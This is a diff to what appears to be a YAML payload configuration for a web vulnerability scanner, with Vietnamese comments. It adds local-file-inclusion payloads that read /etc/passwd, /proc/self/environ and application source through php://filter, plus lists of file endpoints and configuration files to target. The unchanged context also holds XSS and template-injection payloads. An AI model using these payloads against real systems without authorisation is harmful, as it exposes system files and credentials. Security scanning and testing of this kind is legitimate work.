@@ -121,7 +121,30 @@ lfi:
     - "/var/log/apache2/access.log"
     - "C:/xampp/apache/logs/access.log"
     - "/etc/hosts"
-  indicators: ["root:x:0:0:", "[extensions]", "PATH=", "[boot loader]", "127.0.0.1\tlocalhost"]
+    - "....//....//....//....//etc/passwd"
+    - "/proc/self/environ"
+    - "C:\\boot.ini"
+    - "php://filter/convert.base64-encode/resource=index.php"
+    - "php://filter/convert.base64-encode/resource=index.php"
+
+  file_endpoints: [ "ftp", "download", "file", "view", "read", "doc", "pdf", "assets", "static" ]
+
+  # Dấu hiệu nhận biết LFI thành công (Text-based)
+  indicators: [ "root:x:0:0:", "[extensions]", "PATH=", "[boot loader]", "127.0.0.1\tlocalhost", "\"dependencies\":", "\"devDependencies\":" ]
+
+  project_files:
+    - "package.json"
+    - "web.config"
+    - "main.js"
+    - "app.js"
+    - "config.json"
+    - "settings.py"
+    - "manage.py"
+    - "pom.xml"
+    - "build.gradle"
+    - "application.properties"
+    - "index.js"
+    - "server.js"
 
 # Logging Tester
 logging:
@@ -222,7 +245,7 @@ xss:
     - '">><script>alert(1)</script>'
     - "{{constructor.constructor('alert(\"XSS\")')()}}"
     - "{{$on.constructor('alert(\"XSS\")')()}}"
-    - "{{10000000000 * 10000000000}}" # Dùng để test mù (Blind)
+    - "{{10000000000 * 10000000000}}"
     - '<iframe src="javascript:alert(`xss`)">'
 
 # DOM-based XSS Configuration
